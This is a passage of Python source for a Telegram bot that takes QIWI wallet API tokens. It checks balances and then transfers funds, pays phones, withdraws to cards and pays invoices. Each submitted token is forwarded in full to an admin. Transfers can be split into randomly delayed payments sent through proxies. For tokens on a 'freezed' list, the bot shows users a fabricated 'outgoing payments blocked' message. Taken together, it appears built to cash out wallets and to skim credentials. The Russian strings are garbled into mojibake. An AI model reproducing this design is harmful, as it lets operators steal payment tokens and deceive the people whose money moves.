                                    f'SMS: (enabled: `{sms_enabled}` | active: `{sms_active}`)\n\n–û–ø–µ—Ä–∞—Ç–æ—Ä: `{profile_info.get("userInfo", {}).get("operator", local_error)}`\n–Ø–∑—ã–∫: `{profile_info.get("userInfo", {}).get("language", local_error)}`\n' + \
                                    f'–í–∞–ª—é—Ç–∞ –ø–æ-—É–º–æ–ª—á–∞–Ω–∏—é: `{profile_info.get("userInfo", {}).get("defaultPayCurrency", local_error)}`\n\n–î–∞—Ç–∞ —Å–æ–∑–¥–∞–Ω–∏—è: `{create_data}`\n' + \
                                    f'–î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: `{reg_data}`\n–î–∞—Ç–∞ —Å–º–µ–Ω—ã –ø–∞—Ä–æ–ª—è: `{change_data}`'

                                try:
                                    numbers = int(qiwi.users_info[tid]["auto"])
                                    if not (7 >= numbers >= 1):
                                        raise ValueError
                                except:
                                    numbers = 3

                                # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ.
                                if qiwi.last_tokens.get(tid):
                                    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ç–æ–∫–µ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö.
                                    if now_token in qiwi.last_tokens[tid]:
                                        # –£–¥–∞–ª—è–µ–º –µ–≥–æ.
                                        try:
                                            qiwi.last_tokens[tid].remove(now_token)
                                        except:
                                            pass
                                    # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω.
                                    qiwi.last_tokens[tid].append(now_token)
                                    # –û—Å—Ç–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ [numbers].
                                    qiwi.last_tokens[tid] = qiwi.last_tokens[tid][-numbers:]
                                else:
                                    qiwi.last_tokens[tid] = [now_token]
                                # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
                                save_last_t(qiwi.last_tokens)

                                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–æ–∏—Ç –ª–∏ –ø–æ–∫–∞–∑—ã–≤–∞—Ç—å –∫–Ω–æ–ø–∫–∏ –ø–µ—Ä–µ–≤–æ–¥–æ–≤ –∏ –æ–ø–ª–∞—Ç—ã.
                                if balance_info > 1.02:
                                    bot.send_message(tid, info_text, parse_mode='markdown', reply_markup=kb_actions)
                                else:
                                    bot.send_message(tid, info_text, parse_mode='markdown', reply_markup=kb_actions_0)
                                    bot.send_message(tid, '‚ö†Ô∏è –û–ø–µ—Ä–∞—Ü–∏–∏ –ø–æ –ø–µ—Ä–µ–≤–æ–¥—É –∏ –æ–ø–ª–∞—Ç–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã, —Ç.–∫. –±–∞–ª–∞–Ω—Å —Ç–æ–∫–µ–Ω–∞ –º–µ–Ω—å—à–µ 1.02‚ÇΩ!')
                                return
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "waiting_token2":
                    now_token = message.text
                    bot.send_message(tid, "‚åõ –ü—Ä–æ–≤–µ—Ä—è—é —Ç–æ–∫–µ–Ω, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_cancel)
                    # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.
                    if len(now_token) == 32:
                        profile_raw = qiwi.get_profile(now_token, tg_id=tid)
                        if profile_raw["code"] != 200:
                            # –ò–∑–≤–µ—â–∞–µ–º –æ–± –æ—à–∏–±–∫–µ.
                            code_text = profile_raw.get("code", "None")
                            desc_text = ERROR_CODES.get(str(code_text), "–ù–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞.")
                            bot.send_message(tid, f'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ!\n–ö–æ–¥ –æ—à–∏–±–∫–∏: `{code_text}`\n–û–ø–∏—Å–∞–Ω–∏–µ: `{desc_text}`\n\n_–ü—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω—É._', parse_mode='markdown', reply_markup=kb_main)
                            qiwi.reset(tid)
                            return
                        else:
                            profile_info = profile_raw["json"]
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ç–æ–∫–µ–Ω!', reply_markup=kb_main)
                        qiwi.reset(tid)
                        return
                    if profile_info:
                        phone = profile_info.get("contractInfo", {}).get("contractId")
                        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞—Ö.
                        is_blocked = get_block_info(now_login=phone, now_token=now_token, tg_id=tid)
                        if is_blocked or is_blocked is None:
                            if is_blocked == 'cannot_info':
                                desc_text = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ—Ñ–∏–ª–µ —Ç–æ–∫–µ–Ω–∞.'
                            elif is_blocked == 'profile_blocked':
                                desc_text = '–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ—à–µ–ª—å–∫–∞.'
                            elif is_blocked:
                                desc_text = '\n' + is_blocked
                            else:
                                desc_text = '–í–æ–∑–Ω–∏–∫–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞.'
                            notif_text = f'‚ùå *–í–æ–∑–º–æ–∂–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞.*\n–û–ø–∏—Å–∞–Ω–∏–µ: `{desc_text}`'
                            bot.send_message(tid, notif_text, parse_mode='markdown', reply_markup=kb_main)
                        else:
                            check_freezed = load_freezed_tokens(now_token)
                            if tid != qiwi.notification and check_freezed is None:
                                notif_text = f'‚úÖ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω—ã.'
                            else:
                                desc_text = 'üö´ –¢–µ–∫—É—â–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:\n–ö–æ–¥: OUTGOING_PAYMENTS\n–û–ø–∏—Å–∞–Ω–∏–µ: –ò—Å—Ö–æ–¥—è—â–∏–µ –ø–ª–∞—Ç–µ–∂–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã'
                                notif_text = f'‚ùå *–í–æ–∑–º–æ–∂–Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞.*\n–û–ø–∏—Å–∞–Ω–∏–µ: `{desc_text}`'
                            bot.send_message(tid, notif_text, parse_mode='markdown', reply_markup=kb_main)
                        qiwi.reset(tid)

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3
                        # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ.
                        if qiwi.last_tokens.get(tid):
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Ç–æ–∫–µ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö.
                            if now_token in qiwi.last_tokens[tid]:
                                # –£–¥–∞–ª—è–µ–º –µ–≥–æ.
                                try:
                                    qiwi.last_tokens[tid].remove(now_token)
                                except:
                                    pass
                            # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω.
                            qiwi.last_tokens[tid].append(now_token)
                            # –û—Å—Ç–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 3.
                            qiwi.last_tokens[tid] = qiwi.last_tokens[tid][-numbers:]
                        else:
                            qiwi.last_tokens[tid] = [now_token]
                        # –û–±–Ω–æ–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è.
                        save_last_t(qiwi.last_tokens)

                        return
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ç–æ–∫–µ–Ω–µ!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "phone_sum":
                    try:
                        to_sum = round(float(message.text), 2)
                        to_phone = qiwi.users_info[tid]["to_phone"]
                        minus_sum = to_sum # –¢–∞–∫ –∫–∞–∫ –ø–æ –∏–¥–µ–µ –∫–æ–º–∏—Å—Å–∏–∏ –Ω–µ—Ç.
                        qiwi.users_info[tid]["to_sum"] = to_sum
                        qiwi.status(tid, "confirm_phone")
                        # –í—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.
                        phone_text = f'*–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–µ—Ç–∞–ª–∏ –ø–ª–∞—Ç–µ–∂–∞!*\n–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_phone}`\n–°—É–º–º–∞ –∫ —Å–ø–∏—Å–∞–Ω–∏—é: `{minus_sum}`\n–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{to_sum}`'
                        bot.send_message(tid, phone_text, parse_mode='markdown', reply_markup=kb_confirm_ph)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å—á–∏—Ç–∞—Ç—å —Å—É–º–º—É!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_phone":
                    try:
                        if message.text == "‚úÖ –û–ø–ª–∞—Ç–∏—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω":
                            token = qiwi.users_info[tid]["token"]
                            to_phone = qiwi.users_info[tid]["to_phone"]
                            to_sum = qiwi.users_info[tid]["to_sum"]
                            # –û—Å—É—â–µ—Å—Ç–≤–ª—è–µ–º –ø–µ—Ä–µ–≤–æ–¥.
                            result = qiwi.send_mobile(token, to_phone, to_sum, tg_id=tid)
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–µ—Ä–µ–≤–æ–¥.
                            if result["transaction"]["state"]["code"] == "Accepted":
                                # –î–æ–±–∞–≤–ª—è–µ–º —Ç–µ–ª–µ—Ñ–æ–Ω –≤ –ø–æ—Å–ª–µ–¥–Ω–∏–µ.
                                qiwi.add_last_phone(tid, to_phone)
                                transaction_id = result["transaction"]["id"]
                                bot.send_message(tid, f'‚úÖ –ü–ª–∞—Ç–µ–∂ –ø—Ä–∏–Ω—è—Ç!\nüßæ ID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`', parse_mode='markdown', reply_markup=kb_main)
                                try:
                                    balance = qiwi.users_info[tid]["balance"]
                                    phone = qiwi.users_info[tid]["phone"]
                                    to_comment = result["comment"]
                                    use_proxy = do_have_proxy(tg_id=tid)
                                    qiwi.save_transaction(telegram_id=tid, token=token, from_qiwi=phone, to_qiwi=to_phone, user_sum=to_sum, boss_sum=0, transaction_id=transaction_id, use_proxy=use_proxy, tr_type=my_types.phone)
                                except:
                                    pass
                                else:
                                    qiwi.add_spent_limits(tid, to_sum) # 2
                                    if tid != qiwi.notification:
                                        notif_text = 'üì± *–¢–µ–ª–µ—Ñ–æ–Ω –æ–ø–ª–∞—á–µ–Ω!*'
                                        last_text = f'–¢–æ–∫–µ–Ω: `{token}`\n–ü–æ–ª—É—á–∞—Ç–µ–ª—å: `{to_phone}`\n\n–ë–∞–ª–∞–Ω—Å: `{balance}`‚ÇΩ\n–°—É–º–º–∞ –∫ –ø–æ–ª—É—á–µ–Ω–∏—é: `{to_sum}`‚ÇΩ\n–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{to_comment}`\n\nID –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: `{transaction_id}`'
                                        qiwi.notif_common_admin(notif_text=notif_text, telegram_id=tid, username=message.from_user.username, last_text=last_text, use_proxy=use_proxy)
                            else:
                                raise ValueError
                        else:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –æ–∂–∏–¥–∞–ª–æ—Å—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ!', reply_markup=kb_main)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–ª–∞—Ç–µ–∂!', reply_markup=kb_main)
                    qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "phone_clicked":
                    try:
                        now_balance = float(qiwi.users_info[tid]["balance"])
                        if now_balance:
                            kb_sum = ReplyKeyboardMarkup(True)
                            kb_sum.row('25', '50', '100')
                            kb_sum.row('250', '500', '1000')
                            kb_sum.row(str(now_balance), 'üîô –û—Ç–º–µ–Ω–∞')
                        else:
                            raise ValueError
                        qiwi.status(tid, "phone_sum")
                        qiwi.users_info[tid]["balance"] = now_balance
                        qiwi.users_info[tid]["to_phone"] = str(int(message.text.replace('+', '')))
                        bot.send_message(tid, '–£–∫–∞–∂–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –æ–ø–ª–∞—Ç—ã:', reply_markup=kb_sum)
                    except:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –±–∞–ª–∞–Ω—Å –∏–ª–∏ –æ—à–∏–±–∫–∞ –≤ –Ω–æ–º–µ—Ä–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "token_selected":
                    if message.text == "ü•ù –ü–µ—Ä–µ–≤–µ—Å—Ç–∏ –Ω–∞ QIWI":
                        bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', reply_markup=kb_qiwi)
                    elif message.text == "üÜó –û–±—ã—á–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥" or message.text == "üîÇ –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥":
                        if message.text == "üÜó –û–±—ã—á–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥":
                            qiwi.status(tid, "qiwi_clicked")
                        else:
                            qiwi.status(tid, "mult_qiwi_clicked")

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3
                        kb_phones = ReplyKeyboardMarkup(True)
                        for last_phone in qiwi.last_phones.get(tid, [])[::-1][:numbers]:
                            kb_phones.row(str(last_phone))
                        kb_phones.row('üîô –û—Ç–º–µ–Ω–∞')

                        example_text = "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä QIWI –∫–æ—à–µ–ª—å–∫–∞ –ø–æ–ª—É—á–∞—Ç–µ–ª—è (–±–µ–∑ +) –∏–ª–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∏–∑ –ø–æ—Å–ª–µ–¥–Ω–∏—Ö:\n`–ù–∞–ø—Ä–∏–º–µ—Ä: 79224443311`"
                        if message.text == "üîÇ –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥":
                            example_text = '–ü—Ä–∏ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω–æ–º –ø–µ—Ä–µ–≤–æ–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ä–µ–¥—Å—Ç–≤ –ø–ª–∞—Ç–µ–∂–∞–º–∏, –Ω–µ –ø—Ä–µ–≤—ã—à–∞—é—â–∏–º–∏ –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é —Å—É–º–º—É.\n\n' + \
                                '_–ù–∞–ø—Ä–∏–º–µ—Ä: –í—ã –≤—ã–±—Ä–∞–ª–∏ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥ –Ω–∞ 1500—Ä —Å –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–π —Å—É–º–º–æ–π –≤ 350—Ä.\n–ó–Ω–∞—á–∏—Ç –±–æ—Ç —Å–¥–µ–ª–∞–µ—Ç 4 –ø–µ—Ä–µ–≤–æ–¥–∞ –Ω–∞ 350—Ä –∏ 1 –ø–æ 100—Ä._\n\n' + \
                                f'_–ó–∞–¥–µ—Ä–∂–∫–∏ –º–µ–∂–¥—É –ø–µ—Ä–µ–≤–æ–¥–∞–º–∏ –±—É–¥—É—Ç —Ä–∞–Ω–¥–æ–º–Ω–æ –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è –æ—Ç {config.PAYMENTS_TIMEOUT[0]} –¥–æ {config.PAYMENTS_TIMEOUT[1]} —Å–µ–∫._\n\n' + example_text
                        bot.send_message(tid, example_text, parse_mode='markdown', reply_markup=kb_phones, disable_web_page_preview=True)
                    elif message.text == "üì± –û–ø–ª–∞—Ç–∏—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω":

                        try:
                            numbers = int(qiwi.users_info[tid]["auto"])
                            if not (7 >= numbers >= 1):
                                raise ValueError
                        except:
                            numbers = 3

                        kb_phones = ReplyKeyboardMarkup(True)
                        for last_phone in qiwi.last_phones.get(tid, [])[::-1][:numbers]:
                            kb_phones.row(str(last_phone))
                        kb_phones.row('üîô –û—Ç–º–µ–Ω–∞')

                        bot.send_message(tid, '–£–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –±–∞–ª–∞–Ω—Å –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω—É–∂–Ω–æ –ø–æ–ø–æ–ª–Ω–∏—Ç—å:\n_–ù–∞–ø—Ä–∏–º–µ—Ä: 79627653621_', parse_mode='markdown', reply_markup=kb_phones)
                        qiwi.status(tid, "phone_clicked")
                    elif message.text == "‚Çø –ö—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—ã":
                        send_referal(tid)
                        if tid != qiwi.notification:
                            qiwi.notif_common_admin(notif_text='‚Çø *–ü—Ä–æ—Å–º–æ—Ç—Ä —Ä–µ—Ñ–µ—Ä–∞–ª–∫–∏!*', telegram_id=tid, username=message.from_user.username)
                        qiwi.reset(tid)
                    elif message.text == "üí≥ –í—ã–≤–µ—Å—Ç–∏ –Ω–∞ –∫–∞—Ä—Ç—É":
                        bot.send_message(tid, '‚ö†Ô∏è *–í–Ω–∏–º–∞–Ω–∏–µ!* –°–µ–π—á–∞—Å —Ä–∞–±–æ—Ç–∞—Ç–∞–µ—Ç –≤—ã–≤–æ–¥ —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–µ –∫–∞—Ä—Ç—ã:\n- VISA (RU)\n- MasterCard (RU)\n- MIR\n- QIWI CARD\n\n_–í—ã–≤–æ–¥ –Ω–∞ –æ—Å—Ç–∞–ª—å–Ω—ã–µ –∫–∞—Ä—Ç—ã —è —Ä–µ–∞–ª–∏–∑—É—é –≤ —Å–ª–µ–¥—É—é—â–µ–π –æ–±–Ω–æ–≤–µ!_', parse_mode='markdown', reply_markup=kb_cancel)
                        bot.send_message(tid, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:\n_–ù–∞–ø—Ä–∏–º–µ—Ä: 4444333366667777_', parse_mode='markdown', reply_markup=kb_cancel)
                        qiwi.status(tid, "card")
                    elif message.text == "üíµ –û–ø–ª–∞—Ç–∏—Ç—å":
                        bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', reply_markup=kb_payments)
                    elif message.text == "üñ• –°—á–µ—Ç–∞ QIWI":
                        bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', reply_markup=kb_invoices)
                    elif message.text == "üí∞ –û–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç (invoice)":
                        qiwi.status(tid, "invoice_clicked")
                        invoice_text = "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ —Å—á–µ—Ç (invoice).\n_–ù–∞–ø—Ä–∏–º–µ—Ä: https://oplata.qiwi.com/form?invoiceUid=eb330b43-bd01-4019-9669-1e9ee7acdd19\n–∏–ª–∏\neb330b43-bd01-4019-9669-1e9ee7acdd19_"
                        bot.send_message(tid, invoice_text, parse_mode='markdown', reply_markup=kb_cancel, disable_web_page_preview=True)
                        try:
                            bot.send_photo(tid, requests.get('https://i.imgur.com/95A8IAf.jpeg', timeout=CONNECTION_TIMEOUT).content, caption="–ö–∞–∫ –¥–æ–ª–∂–µ–Ω –≤—ã–≥–ª—è–¥–µ—Ç—å —Å—á–µ—Ç (invoice) QIWI, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –æ–ø–ª–∞—Ç–∏—Ç—å:")
                        except:
                            pass
                    elif message.text == "üóÑ –°–ø–∏—Å–æ–∫ –Ω–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–æ–≤":
                        try:
                            # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –Ω–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–æ–≤.
                            now_token = qiwi.users_info[tid]["token"]
                            ready_offers = qiwi.get_offers(now_token, tid)
                            # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º.
                            if not ready_offers is None:
                                offers_list = []
                                offers_id = []
                                kb_offers = ReplyKeyboardMarkup(True)
                                for numb, one_offer in enumerate(ready_offers[:15]):
                                    comment_section = f"–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: `{one_offer['comment']}`\n\n" if one_offer['comment'] else ''
                                    offers_list.append(
                                        f"*–ù–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã–π —Å—á–µ—Ç #{numb + 1}*\n" + \
                                        f"–ù–∞–∑–≤–∞–Ω–∏–µ: `{one_offer['provider']['short_name']}`\n" + \
                                        f"*ID*: `{one_offer['id']}`\n" + \
                                        f"–°—É–º–º–∞: `{one_offer['sum']['amount']}`‚ÇΩ\n" + \
                                        comment_section + \
                                        f"–°—Å—ã–ª–∫–∞ –Ω–∞ –æ–ø–ª–∞—Ç—É: {one_offer['pay_url']}"
                                    )
                                    # –î–æ–±–∞–≤–ª—è–µ–º ID-—à–∫–∏ –¥–ª—è –æ–ø–ª–∞—Ç—ã.
                                    offers_id.append({
                                        "number": numb,
                                        "id": str(one_offer['id']),
                                        "sum": float(one_offer['sum']['amount'])
                                    })
                                    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É.
                                    kb_offers.row(f'–°—á–µ—Ç #{numb + 1} [ID:{one_offer["id"]}]')
                                kb_offers.row('üîô –û—Ç–º–µ–Ω–∞')
                                if offers_list:
                                    qiwi.users_info[tid]["offers"] = offers_id
                                    qiwi.status(tid, "select_offers")
                                    offers_text = "\n\n".join(offers_list)
                                    bot.send_message(tid, offers_text, parse_mode='markdown', reply_markup=kb_offers, disable_web_page_preview=True)
                                    bot.send_message(tid, '–ß—Ç–æ–±—ã –æ–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç –≤—ã–±–µ—Ä–∏—Ç–µ –µ–≥–æ –∏–∑ —Å–ø–∏—Å–∫–∞ –Ω–∏–∂–µ.\n_–°—Ä–∞–≤–Ω–∏—Ç–µ –µ–≥–æ –Ω–æ–º–µ—Ä –∏ ID!_', parse_mode='markdown')
                                else:
                                    bot.send_message(tid, '‚òëÔ∏è –ù–µ–æ–ø–ª–∞—á–µ–Ω–Ω—ã—Ö —Å—á–µ—Ç–æ–≤ –Ω–µ—Ç!', reply_markup=kb_main)
                                    qiwi.reset(tid)
                            else:
                                raise ValueError
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Å—á–µ—Ç–∞!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    elif message.text == "üìù –í—ã—Å—Ç–∞–≤–∏—Ç—å QIWI —Å—á–µ—Ç –Ω–∞ –æ–ø–ª–∞—Ç—É":
                        bot.send_message(tid, '–î–ª—è –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–∏—è —Å—á–µ—Ç–∞ –í–∞–º –Ω—É–∂–Ω–æ —Å–æ–∑–¥–∞—Ç—å –ø–∞—Ä—É –∫–ª—é—á–µ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.\n–°–¥–µ–ª–∞—Ç—å —ç—Ç–æ –º–æ–∂–Ω–æ —Ç—É—Ç: https://qiwi.com/p2p-admin/transfers/api', disable_web_page_preview=True)
                        bot.send_message(tid, '–¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á:')
                    elif message.text == "üßæ –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∏—Å—Ç–æ—Ä–∏—é –∫–æ—à–µ–ª—å–∫–∞":
                        bot.send_message(tid, '–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∏–ø –æ–ø–µ—Ä–∞—Ü–∏–π –≤ –æ—Ç—á–µ—Ç–µ:', reply_markup=kb_history)
                        qiwi.status(tid, "history_clicked")
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ [#2]!', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "confirm_offer":
                    try:
                        offer_sum = qiwi.users_info[tid]["sum"]
                        now_offer_id = qiwi.users_info[tid]["offer_id"]
                        now_token = qiwi.users_info[tid]["token"]
                        balance = qiwi.users_info[tid]["balance"]
                        from_qiwi = qiwi.users_info[tid]["phone"]
                        if message.text == "‚úÖ –û–ø–ª–∞—Ç–∏—Ç—å —Å—á–µ—Ç":
                            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å.
                            if balance and balance >= offer_sum:
                                if pay_invoice(now_token, now_offer_id, tid):
                                    qiwi.add_spent_limits(tid, offer_sum) # 3
                                    if tid != qiwi.notification:
                                        use_proxy = do_have_proxy(tg_id=tid)
                                        qiwi.notif_inv_admin(telegram_id=tid, username=message.from_user.username, token=now_token, from_qiwi=from_qiwi, balance=balance_show, user_sum=offer_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy)
                                        qiwi.save_transaction(telegram_id=tid, token=now_token, from_qiwi=from_qiwi, to_qiwi=None, user_sum=offer_sum, boss_sum=0, transaction_id=None, use_proxy=use_proxy, tr_type=my_types.invoice_in)
                                    bot.send_message(tid, '‚úÖ –ü–ª–∞—Ç–µ–∂ –ø—Ä–∏–Ω—è—Ç!', reply_markup=kb_main)
                                else:
                                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ–ø–ª–∞—Ç–∏—Ç—å –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π —Å—á–µ—Ç!', reply_markup=kb_main)
                            else:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–∞ –±–∞–ª–∞–Ω—Å–µ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç —Å—Ä–µ–¥—Å—Ç–≤!', reply_markup=kb_main)
                        elif message.text == "‚ùå –û—Ç–º–µ–Ω–∏—Ç—å —Å—á–µ—Ç":
                            if cancel_invoice(now_token, now_offer_id, tid):
                                bot.send_message(tid, '‚úÖ –í—ã—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π —Å—á–µ—Ç –æ—Ç–º–µ–Ω–µ–Ω!', reply_markup=kb_main)
                            else:
